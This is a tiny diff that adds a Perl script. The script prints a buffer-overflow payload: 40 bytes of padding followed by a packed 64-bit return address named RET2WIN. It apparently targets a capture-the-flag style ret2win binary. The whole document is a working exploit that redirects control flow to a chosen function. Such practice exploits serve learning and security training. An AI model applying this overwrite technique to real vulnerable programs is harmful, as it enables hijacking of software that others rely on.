@@ -1,0 +1,4 @@
+$PADDING="B"x40;
+$RET2WIN="\x11\x08\x40\x00\x00\x00\x00\x00";
+
+print $PADDING . $RET2WIN;
